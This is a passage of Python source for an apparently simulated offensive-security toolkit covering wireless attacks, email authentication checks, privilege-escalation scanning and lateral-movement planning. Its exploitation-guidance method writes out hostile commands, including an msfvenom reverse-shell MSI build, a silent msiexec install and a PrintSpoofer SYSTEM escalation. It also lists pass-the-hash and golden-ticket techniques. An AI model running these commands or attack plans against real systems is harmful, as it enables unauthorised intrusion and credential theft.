                'finding': 'WPS is enabled',
                'recommendation': 'Disable WPS to prevent PIN attacks'
            })
        
        # Check password policy (simulated)
        if security_type.endswith('personal'):
            password_strength = random.choice(['weak', 'medium', 'strong'])
            if password_strength == 'weak':
                findings.append({
                    'severity': 'high',
                    'finding': 'Weak password detected (common word or short length)',
                    'recommendation': 'Use password with 12+ chars, mixed case, numbers, symbols'
                })
        
        # Check for management frame protection
        if security_type.startswith('wpa2') and random.random() > 0.5:
            findings.append({
                'severity': 'low',
                'finding': 'Management Frame Protection (802.11w) not enabled',
                'recommendation': 'Enable MFP for deauth attack protection'
            })
        
        # Enterprise-specific checks
        if security_type.endswith('enterprise'):
            if random.random() > 0.6:
                findings.append({
                    'severity': 'medium',
                    'finding': 'Certificate validation may be bypassable',
                    'recommendation': 'Enforce strict certificate validation on clients'
                })
        
        # Calculate risk score
        severity_weights = {'critical': 30, 'high': 15, 'medium': 5, 'low': 2}
        risk_score = sum(severity_weights.get(f['severity'], 5) for f in findings)
        
        assessment = {
            'assessment_id': assess_id,
            'ssid': ssid,
            'security_type': security_type,
            'security_level': security_info.get('security_level', 0),
            'encryption': security_info.get('encryption', 'unknown'),
            'assessed_at': datetime.now().isoformat(),
            'findings': findings,
            'risk_score': min(100, risk_score),
            'applicable_attacks': self._get_applicable_attacks(security_type),
            'grade': 'A' if risk_score < 10 else 'B' if risk_score < 30 else 'C' if risk_score < 50 else 'D' if risk_score < 70 else 'F'
        }
        
        self.assessments[assess_id] = assessment
        return assessment
    
    def _get_applicable_attacks(self, security_type: str) -> List[str]:
        """Get attacks applicable to security type."""
        attacks = []
        
        if security_type in ['open', 'wep']:
            attacks.extend(['evil_twin', 'deauth'])
        if security_type in ['wep']:
            attacks.append('wep_crack')
        if security_type.startswith('wpa'):
            attacks.extend(['deauth', 'wpa_crack', 'pmkid', 'evil_twin'])
        if security_type == 'wpa2_personal':
            attacks.append('krack')
        if security_type.startswith('wpa3'):
            attacks.append('dragonblood')
        if security_type.endswith('enterprise'):
            attacks.append('enterprise_attack')
        if 'wps_enabled' in str(security_type):
            attacks.append('wps_attack')
            
        return attacks
    
    def simulate_attack(self, assess_id: str, attack_type: str) -> Dict[str, Any]:
        """Simulate wireless attack execution."""
        attack_info = self.wireless_attacks.get(attack_type)
        if not attack_info:
            return {'error': 'Unknown attack type'}
            
        assessment = self.assessments.get(assess_id)
        if not assessment:
            return {'error': 'Assessment not found'}
        
        # Simulate attack success based on security level
        security_level = assessment.get('security_level', 0)
        success_probability = max(0.1, 0.9 - (security_level * 0.15))
        success = random.random() < success_probability
        
        result = {
            'attack_type': attack_type,
            'name': attack_info['name'],
            'target_ssid': assessment['ssid'],
            'executed_at': datetime.now().isoformat(),
            'success': success,
            'tool_used': random.choice(attack_info['tools']),
            'duration_seconds': random.randint(10, 600)
        }
        
        if success:
            if attack_type in ['wpa_crack', 'pmkid', 'wps_attack']:
                result['credentials_obtained'] = True
                result['password_hint'] = '*' * random.randint(8, 16)
            elif attack_type == 'evil_twin':
                result['clients_connected'] = random.randint(1, 10)
                result['credentials_captured'] = random.randint(0, 5)
            elif attack_type == 'enterprise_attack':
                result['hashes_captured'] = random.randint(1, 20)
                result['ntlm_hashes'] = True
        else:
            result['failure_reason'] = random.choice([
                'Strong encryption prevented attack',
                'No clients available',
                'Detection triggered',
                'Timeout reached'
            ])
        
        return result


class EmailSecurityAnalyzer:
    """Email security configuration analysis."""
    
    def __init__(self):
        self.email_security_records: Dict[str, Dict[str, Any]] = {
            'spf': {
                'name': 'Sender Policy Framework',
                'purpose': 'Authorize mail servers for domain',
                'record_type': 'TXT',
                'example': 'v=spf1 include:_spf.google.com ~all'
            },
            'dkim': {
                'name': 'DomainKeys Identified Mail',
                'purpose': 'Cryptographically sign emails',
                'record_type': 'TXT',
                'example': 'v=DKIM1; k=rsa; p=MIIBIj...'
            },
            'dmarc': {
                'name': 'Domain-based Message Authentication',
                'purpose': 'Policy for SPF/DKIM failures',
                'record_type': 'TXT',
                'example': 'v=DMARC1; p=reject; rua=mailto:dmarc@domain.com'
            },
            'bimi': {
                'name': 'Brand Indicators for Message Identification',
                'purpose': 'Display brand logo in email clients',
                'record_type': 'TXT',
                'example': 'v=BIMI1; l=https://domain.com/logo.svg'
            },
            'mta_sts': {
                'name': 'MTA Strict Transport Security',
                'purpose': 'Require TLS for email transport',
                'record_type': 'TXT',
                'example': 'v=STSv1; id=20230101'
            },
            'dane': {
                'name': 'DNS-based Authentication of Named Entities',
                'purpose': 'Certificate validation via DNS',
                'record_type': 'TLSA'
            }
        }
        
        self.phishing_indicators: List[str] = [
            'Sender domain doesn\'t match reply-to',
            'Suspicious attachment types',
            'Urgency language in subject',
            'Mismatched display name and email',
            'Recently registered sender domain',
            'Links to non-corporate domains',
            'Request for credentials',
            'Unusual sending time',
            'Grammar/spelling errors',
            'Generic greeting'
        ]
        
        self.assessments: Dict[str, Dict[str, Any]] = {}
        
    def analyze_domain(self, domain: str) -> Dict[str, Any]:
        """Analyze email security configuration for a domain."""
        assess_id = f"EMAIL-{len(self.assessments)+1:04d}"
        
        # Simulate DNS record checks
        records = {
            'spf': {
                'present': random.random() > 0.2,
                'policy': random.choice(['-all', '~all', '?all', '+all']) if random.random() > 0.2 else None,
                'includes': random.randint(1, 5) if random.random() > 0.2 else 0
            },
            'dkim': {
                'present': random.random() > 0.3,
                'selectors_found': random.sample(['default', 'google', 's1', 's2', 'mail'], 
                                                random.randint(0, 3)) if random.random() > 0.3 else [],
                'key_size': random.choice([1024, 2048, 4096]) if random.random() > 0.3 else None
            },
            'dmarc': {
                'present': random.random() > 0.4,
                'policy': random.choice(['none', 'quarantine', 'reject']) if random.random() > 0.4 else None,
                'reporting': random.random() > 0.5 if random.random() > 0.4 else False,
                'pct': random.choice([25, 50, 75, 100]) if random.random() > 0.4 else None
            },
            'mta_sts': {
                'present': random.random() > 0.7,
                'mode': random.choice(['testing', 'enforce']) if random.random() > 0.7 else None
            },
            'bimi': {
                'present': random.random() > 0.85
            }
        }
        
        findings = []
        
        # Analyze SPF
        if not records['spf']['present']:
            findings.append({
                'severity': 'high',
                'category': 'SPF',
                'finding': 'No SPF record found',
                'impact': 'Domain can be spoofed by any mail server',
                'recommendation': 'Implement SPF record with appropriate includes'
            })
        elif records['spf']['policy'] in ['+all', '?all']:
            findings.append({
                'severity': 'high',
                'category': 'SPF',
                'finding': f"Weak SPF policy: {records['spf']['policy']}",
                'impact': 'SPF provides limited protection',
                'recommendation': 'Change to ~all or preferably -all'
            })
        
        # Analyze DKIM
        if not records['dkim']['present']:
            findings.append({
                'severity': 'high',
                'category': 'DKIM',
                'finding': 'No DKIM records found',
                'impact': 'Emails cannot be cryptographically verified',
                'recommendation': 'Configure DKIM signing for outbound email'
            })
        elif records['dkim']['key_size'] and records['dkim']['key_size'] < 2048:
            findings.append({
                'severity': 'medium',
                'category': 'DKIM',
                'finding': f"DKIM key size ({records['dkim']['key_size']}) is weak",
                'impact': 'Key may be crackable',
                'recommendation': 'Use 2048-bit or larger DKIM keys'
            })
        
        # Analyze DMARC
        if not records['dmarc']['present']:
            findings.append({
                'severity': 'high',
                'category': 'DMARC',
                'finding': 'No DMARC record found',
                'impact': 'No policy enforcement for SPF/DKIM failures',
                'recommendation': 'Implement DMARC starting with p=none for monitoring'
            })
        elif records['dmarc']['policy'] == 'none':
            findings.append({
                'severity': 'medium',
                'category': 'DMARC',
                'finding': 'DMARC policy is set to none (monitoring only)',
                'impact': 'Failed emails are not rejected',
                'recommendation': 'Progress to quarantine or reject after analysis'
            })
        
        # Calculate security score
        score = 100
        for finding in findings:
            if finding['severity'] == 'critical':
                score -= 30
            elif finding['severity'] == 'high':
                score -= 20
            elif finding['severity'] == 'medium':
                score -= 10
            else:
                score -= 5
        
        assessment = {
            'assessment_id': assess_id,
            'domain': domain,
            'assessed_at': datetime.now().isoformat(),
            'records': records,
            'findings': findings,
            'security_score': max(0, score),
            'grade': 'A' if score >= 90 else 'B' if score >= 75 else 'C' if score >= 60 else 'D' if score >= 40 else 'F',
            'spoofing_risk': 'Low' if score >= 75 else 'Medium' if score >= 50 else 'High',
            'recommendations': [
                'Implement all three: SPF, DKIM, and DMARC',
                'Progress DMARC to p=reject',
                'Enable DMARC reporting for visibility',
                'Consider MTA-STS for transport security',
                'Implement BIMI for brand recognition'
            ]
        }
        
        self.assessments[assess_id] = assessment
        return assessment
    
    def analyze_email_headers(self, headers: Dict[str, str]) -> Dict[str, Any]:
        """Analyze email headers for security issues."""
        findings = []
        authentication_results = {}
        
        # Simulate header analysis
        auth_results = headers.get('Authentication-Results', '')
        
        # Check SPF result
        spf_result = random.choice(['pass', 'fail', 'softfail', 'neutral', 'none'])
        authentication_results['spf'] = spf_result
        if spf_result in ['fail', 'softfail']:
            findings.append({
                'indicator': 'SPF Failure',
                'severity': 'high' if spf_result == 'fail' else 'medium',
                'details': f"SPF check returned {spf_result}"
            })
        
        # Check DKIM result
        dkim_result = random.choice(['pass', 'fail', 'none'])
        authentication_results['dkim'] = dkim_result
        if dkim_result == 'fail':
            findings.append({
                'indicator': 'DKIM Failure',
                'severity': 'high',
                'details': 'DKIM signature verification failed'
            })
        
        # Check DMARC result
        dmarc_result = random.choice(['pass', 'fail', 'none'])
        authentication_results['dmarc'] = dmarc_result
        if dmarc_result == 'fail':
            findings.append({
                'indicator': 'DMARC Failure',
                'severity': 'high',
                'details': 'DMARC policy check failed'
            })
        
        # Check for suspicious patterns
        if random.random() > 0.7:
            indicator = random.choice(self.phishing_indicators)
            findings.append({
                'indicator': indicator,
                'severity': 'medium',
                'details': f"Potential phishing indicator detected: {indicator}"
            })
        
        # Calculate threat score
        threat_score = sum(20 if f['severity'] == 'high' else 10 for f in findings)
        
        return {
            'analyzed_at': datetime.now().isoformat(),
            'authentication_results': authentication_results,
            'findings': findings,
            'threat_score': min(100, threat_score),
            'verdict': 'Suspicious' if threat_score > 30 else 'Clean',
            'action_recommended': 'Quarantine' if threat_score > 50 else 'Warn' if threat_score > 20 else 'Deliver'
        }
    
    def generate_email_report(self, assess_id: str) -> str:
        """Generate email security assessment report."""
        assessment = self.assessments.get(assess_id)
        if not assessment:
            return "Assessment not found"
            
        lines = [
            "=" * 70,
            "üìß EMAIL SECURITY ASSESSMENT REPORT",
            "=" * 70,
            "",
            f"Domain: {assessment['domain']}",
            f"Assessment ID: {assess_id}",
            f"Date: {assessment['assessed_at']}",
            "",
            f"üìä SECURITY SCORE: {assessment['security_score']}/100 (Grade: {assessment['grade']})",
            f"‚ö†Ô∏è SPOOFING RISK: {assessment['spoofing_risk']}",
            "",
            "üîê EMAIL AUTHENTICATION RECORDS",
            "‚îÄ" * 40
        ]
        
        records = assessment['records']
        for record_type in ['spf', 'dkim', 'dmarc', 'mta_sts', 'bimi']:
            record = records.get(record_type, {})
            present = record.get('present', False)
            icon = '‚úÖ' if present else '‚ùå'
            lines.append(f"   {icon} {record_type.upper()}: {'Configured' if present else 'Missing'}")
            
            if present:
                if record_type == 'spf' and record.get('policy'):
                    lines.append(f"      Policy: {record['policy']}")
                elif record_type == 'dmarc' and record.get('policy'):
                    lines.append(f"      Policy: p={record['policy']}")
                elif record_type == 'dkim' and record.get('key_size'):
                    lines.append(f"      Key Size: {record['key_size']} bits")
        
        if assessment['findings']:
            lines.extend([
                "",
                "‚ö†Ô∏è FINDINGS",
                "‚îÄ" * 40
            ])
            
            for finding in assessment['findings']:
                sev_icon = {'high': 'üî¥', 'medium': 'üü°', 'low': 'üü¢'}.get(finding['severity'], '‚ö™')
                lines.append(f"   {sev_icon} [{finding['category']}] {finding['finding']}")
        
        lines.extend([
            "",
            "üìã RECOMMENDATIONS",
            "‚îÄ" * 40
        ])
        
        for rec in assessment['recommendations'][:5]:
            lines.append(f"   ‚Ä¢ {rec}")
        
        lines.extend([
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class PrivilegeEscalationFinder:
    """Identify privilege escalation opportunities."""
    
    def __init__(self):
        self.linux_privesc: Dict[str, Dict[str, Any]] = {
            'suid_binaries': {
                'name': 'SUID Binary Exploitation',
                'description': 'Exploit misconfigured SUID binaries',
                'technique_id': 'T1548.001',
                'common_targets': ['find', 'vim', 'nmap', 'python', 'perl', 'awk', 'less']
            },
            'sudo_misconfig': {
                'name': 'Sudo Misconfiguration',
                'description': 'Abuse sudo rules for privilege escalation',
                'technique_id': 'T1548.003',
                'checks': ['NOPASSWD entries', 'Wildcard abuse', 'Environment variables']
            },
            'kernel_exploit': {
                'name': 'Kernel Exploitation',
                'description': 'Exploit vulnerable kernel versions',
                'technique_id': 'T1068',
                'common_exploits': ['DirtyPipe', 'DirtyCow', 'Overlayfs']
            },
            'cron_jobs': {
                'name': 'Cron Job Abuse',
                'description': 'Exploit writable cron scripts',
                'technique_id': 'T1053.003',
                'checks': ['Writable scripts', 'Path hijacking', 'Wildcard injection']
            },
            'capabilities': {
                'name': 'Linux Capabilities',
                'description': 'Abuse dangerous capabilities',
                'technique_id': 'T1548',
                'dangerous_caps': ['CAP_SETUID', 'CAP_DAC_OVERRIDE', 'CAP_SYS_ADMIN']
            },
            'writable_paths': {
                'name': 'Writable Path Hijacking',
                'description': 'Hijack writable directories in PATH',
                'technique_id': 'T1574.007',
                'checks': ['World-writable PATH directories', 'Shared library paths']
            },
            'docker_escape': {
                'name': 'Docker Escape',
                'description': 'Escape from container to host',
                'technique_id': 'T1611',
                'methods': ['Privileged container', 'Docker socket', 'Kernel exploits']
            },
            'password_files': {
                'name': 'Credential Files',
                'description': 'Find plaintext passwords in files',
                'technique_id': 'T1552.001',
                'locations': ['.bash_history', 'config files', 'scripts']
            }
        }
        
        self.windows_privesc: Dict[str, Dict[str, Any]] = {
            'unquoted_service': {
                'name': 'Unquoted Service Paths',
                'description': 'Exploit unquoted service binary paths',
                'technique_id': 'T1574.009'
            },
            'weak_service_perms': {
                'name': 'Weak Service Permissions',
                'description': 'Modify service configuration',
                'technique_id': 'T1574.011'
            },
            'dll_hijacking': {
                'name': 'DLL Hijacking',
                'description': 'Plant malicious DLLs in search path',
                'technique_id': 'T1574.001'
            },
            'always_install_elevated': {
                'name': 'AlwaysInstallElevated',
                'description': 'MSI packages install with SYSTEM privileges',
                'technique_id': 'T1548.002',
                'registry_keys': [
                    'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer',
                    'HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer'
                ]
            },
            'stored_credentials': {
                'name': 'Stored Credentials',
                'description': 'Extract saved Windows credentials',
                'technique_id': 'T1555',
                'methods': ['Credential Manager', 'SAM database', 'DPAPI']
            },
            'token_impersonation': {
                'name': 'Token Impersonation',
                'description': 'Impersonate privileged token',
                'technique_id': 'T1134.001',
                'tools': ['Incognito', 'Potato family']
            },
            'uac_bypass': {
                'name': 'UAC Bypass',
                'description': 'Bypass User Account Control',
                'technique_id': 'T1548.002',
                'methods': ['fodhelper', 'eventvwr', 'sdclt']
            },
            'printspoofer': {
                'name': 'PrintSpoofer/Potato',
                'description': 'SeImpersonatePrivilege to SYSTEM',
                'technique_id': 'T1134',
                'requirement': 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege'
            },
            'scheduled_tasks': {
                'name': 'Scheduled Task Abuse',
                'description': 'Hijack or create scheduled tasks',
                'technique_id': 'T1053.005'
            }
        }
        
        self.scans: Dict[str, Dict[str, Any]] = {}
        
    def scan_linux(self, hostname: str) -> Dict[str, Any]:
        """Scan Linux system for privilege escalation opportunities."""
        scan_id = f"PRIVESC-{len(self.scans)+1:04d}"
        
        findings = []
        
        # Simulate checking each privesc vector
        for vector_id, vector in self.linux_privesc.items():
            if random.random() > 0.6:  # 40% chance to find each vector
                finding = {
                    'id': f"LINPRIV-{len(findings)+1:04d}",
                    'vector': vector_id,
                    'name': vector['name'],
                    'description': vector['description'],
                    'technique_id': vector['technique_id'],
                    'exploitability': random.choice(['easy', 'moderate', 'difficult']),
                    'details': {}
                }
                
                # Add specific details based on vector
                if vector_id == 'suid_binaries':
                    finding['details']['binaries'] = random.sample(
                        vector['common_targets'], random.randint(1, 3))
                elif vector_id == 'kernel_exploit':
                    finding['details']['kernel_version'] = f"5.{random.randint(1,15)}.{random.randint(0,50)}"
                    finding['details']['possible_exploits'] = random.sample(
                        vector['common_exploits'], random.randint(1, 2))
                elif vector_id == 'sudo_misconfig':
                    finding['details']['sudo_rules'] = [
                        f"user ALL=(root) NOPASSWD: /usr/bin/{random.choice(['vim', 'less', 'find'])}"
                    ]
                
                findings.append(finding)
        
        # Sort by exploitability
        exploitability_order = {'easy': 0, 'moderate': 1, 'difficult': 2}
        findings.sort(key=lambda x: exploitability_order.get(x['exploitability'], 99))
        
        scan = {
            'scan_id': scan_id,
            'hostname': hostname,
            'os': 'Linux',
            'scanned_at': datetime.now().isoformat(),
            'findings': findings,
            'total_vectors_found': len(findings),
            'easy_wins': sum(1 for f in findings if f['exploitability'] == 'easy'),
            'risk_level': 'Critical' if any(f['exploitability'] == 'easy' for f in findings) else
                         'High' if len(findings) > 3 else 'Medium' if len(findings) > 0 else 'Low'
        }
        
        self.scans[scan_id] = scan
        return scan
    
    def scan_windows(self, hostname: str) -> Dict[str, Any]:
        """Scan Windows system for privilege escalation opportunities."""
        scan_id = f"PRIVESC-{len(self.scans)+1:04d}"
        
        findings = []
        
        # Simulate checking each privesc vector
        for vector_id, vector in self.windows_privesc.items():
            if random.random() > 0.6:
                finding = {
                    'id': f"WINPRIV-{len(findings)+1:04d}",
                    'vector': vector_id,
                    'name': vector['name'],
                    'description': vector['description'],
                    'technique_id': vector['technique_id'],
                    'exploitability': random.choice(['easy', 'moderate', 'difficult']),
                    'details': {}
                }
                
                # Add specific details
                if vector_id == 'unquoted_service':
                    finding['details']['services'] = [
                        f"VulnService{random.randint(1,5)}",
                        f"C:\\Program Files\\App Name\\service.exe"
                    ]
                elif vector_id == 'token_impersonation':
                    finding['details']['privilege'] = 'SeImpersonatePrivilege'
                    finding['details']['tool_suggestion'] = 'PrintSpoofer or GodPotato'
                
                findings.append(finding)
        
        exploitability_order = {'easy': 0, 'moderate': 1, 'difficult': 2}
        findings.sort(key=lambda x: exploitability_order.get(x['exploitability'], 99))
        
        scan = {
            'scan_id': scan_id,
            'hostname': hostname,
            'os': 'Windows',
            'scanned_at': datetime.now().isoformat(),
            'findings': findings,
            'total_vectors_found': len(findings),
            'easy_wins': sum(1 for f in findings if f['exploitability'] == 'easy'),
            'risk_level': 'Critical' if any(f['exploitability'] == 'easy' for f in findings) else
                         'High' if len(findings) > 3 else 'Medium' if len(findings) > 0 else 'Low'
        }
        
        self.scans[scan_id] = scan
        return scan
    
    def get_exploitation_guidance(self, scan_id: str, 
                                  finding_id: str) -> Dict[str, Any]:
        """Get detailed exploitation guidance for a finding."""
        scan = self.scans.get(scan_id)
        if not scan:
            return {'error': 'Scan not found'}
            
        finding = next((f for f in scan['findings'] if f['id'] == finding_id), None)
        if not finding:
            return {'error': 'Finding not found'}
        
        guidance = {
            'finding': finding,
            'exploitation_steps': [],
            'tools': [],
            'references': []
        }
        
        # Generate guidance based on vector
        vector = finding['vector']
        os_type = scan['os']
        
        if os_type == 'Linux':
            if vector == 'suid_binaries':
                guidance['tools'] = ['GTFOBins reference']
                guidance['exploitation_steps'] = [
                    f"1. Identify SUID binaries: find / -perm -4000 2>/dev/null",
                    f"2. Check GTFOBins for exploitation: https://gtfobins.github.io/",
                    f"3. Execute privilege escalation using identified method"
                ]
                guidance['references'] = ['https://gtfobins.github.io/']
            elif vector == 'sudo_misconfig':
                guidance['tools'] = ['sudo -l', 'GTFOBins']
                guidance['exploitation_steps'] = [
                    "1. List sudo permissions: sudo -l",
                    "2. Identify exploitable commands",
                    "3. Use GTFOBins for exploitation method"
                ]
        elif os_type == 'Windows':
            if vector == 'token_impersonation':
                guidance['tools'] = ['PrintSpoofer', 'GodPotato', 'JuicyPotato']
                guidance['exploitation_steps'] = [
                    "1. Verify SeImpersonatePrivilege: whoami /priv",
                    "2. Upload appropriate Potato exploit",
                    "3. Execute: PrintSpoofer.exe -i -c cmd",
                    "4. Verify SYSTEM access"
                ]
            elif vector == 'always_install_elevated':
                guidance['tools'] = ['msiexec', 'msfvenom']
                guidance['exploitation_steps'] = [
                    "1. Generate malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi",
                    "2. Transfer to target",
                    "3. Execute: msiexec /quiet /qn /i malicious.msi"
                ]
        
        return guidance
    
    def generate_privesc_report(self, scan_id: str) -> str:
        """Generate privilege escalation scan report."""
        scan = self.scans.get(scan_id)
        if not scan:
            return "Scan not found"
            
        lines = [
            "=" * 70,
            "‚¨ÜÔ∏è PRIVILEGE ESCALATION ASSESSMENT REPORT",
            "=" * 70,
            "",
            f"Target: {scan['hostname']}",
            f"OS: {scan['os']}",
            f"Scan ID: {scan_id}",
            f"Date: {scan['scanned_at']}",
            "",
            f"üìä RISK LEVEL: {scan['risk_level']}",
            f"   Vectors Found: {scan['total_vectors_found']}",
            f"   Easy Wins: {scan['easy_wins']}",
            "",
            "üéØ PRIVILEGE ESCALATION VECTORS",
            "‚îÄ" * 40
        ]
        
        for finding in scan['findings']:
            exploit_icon = {'easy': 'üü¢', 'moderate': 'üü°', 'difficult': 'üî¥'}.get(
                finding['exploitability'], '‚ö™')
            
            lines.append(f"\n   {exploit_icon} {finding['name']}")
            lines.append(f"      Technique: {finding['technique_id']}")
            lines.append(f"      Exploitability: {finding['exploitability'].upper()}")
            lines.append(f"      {finding['description']}")
            
            if finding['details']:
                for key, value in finding['details'].items():
                    if isinstance(value, list):
                        lines.append(f"      {key}: {', '.join(str(v) for v in value)}")
                    else:
                        lines.append(f"      {key}: {value}")
        
        lines.extend([
            "",
            "üìã RECOMMENDATIONS",
            "‚îÄ" * 40,
            "   1. Address easy-win vectors first",
            "   2. Remove unnecessary SUID/sudo permissions",
            "   3. Keep system and kernel updated",
            "   4. Implement principle of least privilege",
            "   5. Regular privilege escalation assessments",
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class LateralMovementPlanner:
    """Advanced lateral movement planning and simulation."""
    
    MOVEMENT_TECHNIQUES = {
        'pass_the_hash': {
            'name': 'Pass the Hash',
            'mitre_id': 'T1550.002',
            'description': 'Use NTLM hash to authenticate without password',
            'requirements': ['ntlm_hash', 'smb_access'],
            'detection_risk': 'high',
            'tools': ['mimikatz', 'pth-toolkit', 'impacket'],
            'platforms': ['windows']
        },
        'pass_the_ticket': {
            'name': 'Pass the Ticket',
            'mitre_id': 'T1550.003',
            'description': 'Use Kerberos tickets to authenticate',
            'requirements': ['kerberos_ticket', 'domain_access'],
            'detection_risk': 'high',
            'tools': ['rubeus', 'mimikatz'],
            'platforms': ['windows']
        },
        'ssh_key': {
            'name': 'SSH Key Authentication',
            'mitre_id': 'T1021.004',
            'description': 'Use stolen SSH keys for access',
            'requirements': ['ssh_private_key', 'ssh_access'],
            'detection_risk': 'medium',
            'tools': ['ssh', 'paramiko'],
            'platforms': ['linux', 'macos']
        },
        'wmi_exec': {
            'name': 'WMI Execution',
            'mitre_id': 'T1047',
            'description': 'Execute commands via WMI',
            'requirements': ['admin_creds', 'wmi_access'],
            'detection_risk': 'medium',
            'tools': ['wmiexec', 'impacket'],
            'platforms': ['windows']
        },
        'psexec': {
            'name': 'PsExec',
            'mitre_id': 'T1021.002',
            'description': 'Remote service execution',
            'requirements': ['admin_creds', 'smb_access', 'admin_share'],
            'detection_risk': 'high',
            'tools': ['psexec', 'impacket-psexec'],
            'platforms': ['windows']
        },
        'dcom': {
            'name': 'DCOM Execution',
            'mitre_id': 'T1021.003',
            'description': 'Execute via Distributed COM',
            'requirements': ['admin_creds', 'dcom_access'],
            'detection_risk': 'low',
            'tools': ['dcomexec', 'impacket'],
            'platforms': ['windows']
        },
        'winrm': {
            'name': 'WinRM',
            'mitre_id': 'T1021.006',
            'description': 'Windows Remote Management',
            'requirements': ['valid_creds', 'winrm_enabled'],
            'detection_risk': 'medium',
            'tools': ['evil-winrm', 'pywinrm'],
            'platforms': ['windows']
        },
        'rdp': {
            'name': 'Remote Desktop',
            'mitre_id': 'T1021.001',
            'description': 'Remote Desktop Protocol access',
            'requirements': ['valid_creds', 'rdp_enabled'],
            'detection_risk': 'low',
            'tools': ['xfreerdp', 'rdesktop'],
            'platforms': ['windows']
        },
        'smbexec': {
            'name': 'SMB Execution',
            'mitre_id': 'T1021.002',
            'description': 'Execute via SMB shares',
            'requirements': ['admin_creds', 'smb_access'],
            'detection_risk': 'medium',
            'tools': ['smbexec', 'impacket'],
            'platforms': ['windows']
        },
        'golden_ticket': {
            'name': 'Golden Ticket',
            'mitre_id': 'T1558.001',
            'description': 'Forge Kerberos TGT with krbtgt hash',
            'requirements': ['krbtgt_hash', 'domain_sid'],
            'detection_risk': 'low',
            'tools': ['mimikatz', 'ticketer'],
            'platforms': ['windows']
        }
    }
    
    NETWORK_SEGMENTS = {
        'dmz': {'trust_level': 'low', 'accessibility': 'high', 'value': 'medium'},
        'internal': {'trust_level': 'medium', 'accessibility': 'medium', 'value': 'high'},
        'servers': {'trust_level': 'high', 'accessibility': 'low', 'value': 'critical'},
        'workstations': {'trust_level': 'medium', 'accessibility': 'high', 'value': 'low'},
        'cloud': {'trust_level': 'high', 'accessibility': 'medium', 'value': 'high'},
        'ot_ics': {'trust_level': 'critical', 'accessibility': 'low', 'value': 'critical'}
    }
    
    def __init__(self):
        self.network_map = {}
        self.credentials = []
        self.discovered_hosts = []
        self.movement_history = []
        self.pivot_points = []
    
    def add_host(self, host_info: Dict[str, Any]) -> None:
        """Add discovered host to network map."""
        host_id = host_info.get('ip', host_info.get('hostname', str(uuid.uuid4())))
        self.network_map[host_id] = {
            'ip': host_info.get('ip'),
            'hostname': host_info.get('hostname'),
            'os': host_info.get('os', 'unknown'),
            'segment': host_info.get('segment', 'internal'),
            'open_ports': host_info.get('open_ports', []),
            'services': host_info.get('services', []),
            'compromised': host_info.get('compromised', False),
            'credentials': host_info.get('credentials', []),
            'access_level': host_info.get('access_level', 'none')
        }
        self.discovered_hosts.append(host_id)
    
    def add_credential(self, credential: Dict[str, Any]) -> None:
        """Add harvested credential."""
        self.credentials.append({
            'type': credential.get('type', 'password'),
            'username': credential.get('username'),
            'domain': credential.get('domain'),
            'value': credential.get('value'),  # password/hash/key
            'source_host': credential.get('source_host'),
            'harvested_time': datetime.now().isoformat(),
            'tested_on': [],
            'valid_for': []
        })
    
    def find_movement_paths(self, source_host: str, target_host: str) -> List[Dict[str, Any]]:
        """Find possible lateral movement paths between hosts."""
        paths = []
        
        source = self.network_map.get(source_host)
        target = self.network_map.get(target_host)
        
        if not source or not target:
            return paths
        
        target_os = target.get('os', 'unknown').lower()
        target_services = target.get('services', [])
        target_ports = target.get('open_ports', [])
        
        for tech_id, technique in self.MOVEMENT_TECHNIQUES.items():
            # Check platform compatibility
            if target_os not in ['unknown'] + technique['platforms']:
                continue
            
            # Check service requirements
            path_viable = True
            requirements_met = []
            requirements_missing = []
            
            for req in technique['requirements']:
                if self._check_requirement(req, source, target, target_services, target_ports):
                    requirements_met.append(req)
                else:
                    requirements_missing.append(req)
                    path_viable = False
            
            # Calculate path score
            score = self._calculate_path_score(technique, len(requirements_met), len(technique['requirements']))
            
            paths.append({
                'technique': tech_id,
                'name': technique['name'],
                'mitre_id': technique['mitre_id'],
                'viable': path_viable,
                'score': score,
                'detection_risk': technique['detection_risk'],
                'requirements_met': requirements_met,
                'requirements_missing': requirements_missing,
                'recommended_tools': technique['tools'],
                'description': technique['description']
            })
        
        # Sort by viability and score
        paths.sort(key=lambda x: (not x['viable'], -x['score']))
        return paths
    
    def _check_requirement(self, req: str, source: Dict, target: Dict, 
                          services: List, ports: List) -> bool:
        """Check if a requirement is met."""
        requirement_checks = {
            'ntlm_hash': lambda: any(c['type'] == 'ntlm' for c in self.credentials),
            'kerberos_ticket': lambda: any(c['type'] == 'ticket' for c in self.credentials),
            'ssh_private_key': lambda: any(c['type'] == 'ssh_key' for c in self.credentials),
            'admin_creds': lambda: any(c.get('admin', False) for c in self.credentials),
            'valid_creds': lambda: len(self.credentials) > 0,
            'smb_access': lambda: 445 in ports or 'smb' in services,
            'ssh_access': lambda: 22 in ports or 'ssh' in services,
            'wmi_access': lambda: 135 in ports or 'wmi' in services,
            'dcom_access': lambda: 135 in ports,
            'winrm_enabled': lambda: 5985 in ports or 5986 in ports,
            'rdp_enabled': lambda: 3389 in ports or 'rdp' in services,
            'admin_share': lambda: 445 in ports,
            'domain_access': lambda: any(c.get('domain') for c in self.credentials),
            'krbtgt_hash': lambda: any(c['type'] == 'krbtgt' for c in self.credentials),
            'domain_sid': lambda: True  # Assume can be obtained
        }
        
        checker = requirement_checks.get(req, lambda: False)
        return checker()
    
    def _calculate_path_score(self, technique: Dict, met: int, total: int) -> float:
        """Calculate path viability score."""
        if total == 0:
            return 0.0
        
        base_score = (met / total) * 100
        
        # Adjust for detection risk
        risk_modifier = {
            'low': 1.2,
            'medium': 1.0,
            'high': 0.8
        }
        
        modifier = risk_modifier.get(technique['detection_risk'], 1.0)
        return base_score * modifier
    
    def plan_attack_path(self, start_host: str, end_host: str) -> Dict[str, Any]:
        """Plan complete attack path with multiple hops."""
        # Simple pathfinding between hosts
        plan = {
            'start': start_host,
            'end': end_host,
            'hops': [],
            'total_detection_risk': 'low',
            'estimated_time': 0,
            'required_tools': set(),
            'success_probability': 0.0
        }
        
        # Direct path first
        direct_paths = self.find_movement_paths(start_host, end_host)
        viable_direct = [p for p in direct_paths if p['viable']]
        
        if viable_direct:
            best_path = viable_direct[0]
            plan['hops'].append({
                'from': start_host,
                'to': end_host,
                'technique': best_path['technique'],
                'detection_risk': best_path['detection_risk']
